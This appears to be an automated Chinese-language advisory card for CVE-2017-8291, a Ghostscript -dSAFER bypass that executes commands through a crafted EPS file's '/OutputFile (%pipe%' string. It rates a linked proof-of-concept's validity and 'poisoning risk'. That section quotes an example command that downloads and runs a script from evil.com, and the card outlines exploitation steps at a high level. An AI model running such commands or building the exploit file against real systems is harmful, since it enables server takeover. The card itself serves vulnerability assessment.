## CVE-2017-8291-Ghostscript远程命令执行

**漏洞编号:** CVE-2017-8291

**漏洞类型:** 远程命令执行

**影响应用:** Ghostscript

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 通过 2017-04-26 的 Ghostscript

**利用条件:** 需要目标系统安装 Ghostscript 并且处理EPS文件，通常发生在文件上传或者打印服务中

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-8291 漏洞存在于 Artifex Ghostscript 中，允许攻击者绕过 -dSAFER 保护并执行远程命令。该漏洞利用了 .rsdparams 的类型混淆，通过在 EPS 文件中使用包含 '/OutputFile (%pipe%' 子字符串的精心构造的 .eps 文件作为 gs 程序的输入。

**有效性：** 根据漏洞库信息、搜索引擎结果和Exploit-DB链接，该漏洞是真实存在的，并且存在公开的利用代码。提供的POC代码`/tmp/d868cbd22f46c85caf5ffe83836fa19c/README.md`内容过于简单，仅仅包含CVE编号，但参考Exploit-DB（41955）可以找到完整的POC。

**投毒风险：** 提供的README.md文件本身并不包含任何恶意代码，但不能排除在实际利用场景中，攻击者会将恶意命令注入到通过`/OutputFile (%pipe%`执行的shell命令中。例如，利用该漏洞执行`wget http://evil.com/malicious.sh && chmod +x malicious.sh && ./malicious.sh`，从而下载并执行恶意脚本。因此，存在一定的投毒风险，主要体现在攻击者注入的恶意命令中，而非提供的README.md本身。因为缺乏实际的利用代码分析，这里假设存在10%的投毒风险，主要是指利用过程中可能引入的第三方恶意代码。

**利用方式：**
1.  **构造恶意的 EPS 文件：**  创建一个包含 '/OutputFile (%pipe%' 子字符串的 EPS 文件，利用 .rsdparams 类型混淆，允许执行任意命令。
2.  **利用 `gs` 命令处理 EPS 文件：**  使用 Ghostscript 的 `gs` 命令处理该 EPS 文件。
3.  **绕过 `-dSAFER` 保护：**  通过该漏洞绕过 Ghostscript 的 `-dSAFER` 保护机制。
4.  **执行远程命令：**  `/OutputFile (%pipe%`会将后面的字符串作为命令执行。
5.  **命令注入：**  攻击者可以将恶意指令注入到命令执行流程中，例如反弹shell，下载执行恶意程序。

**项目地址:** [shun1403/CVE-2017-8291](https://github.com/shun1403/CVE-2017-8291)

**漏洞详情:** [CVE-2017-8291](https://nvd.nist.gov/vuln/detail/CVE-2017-8291)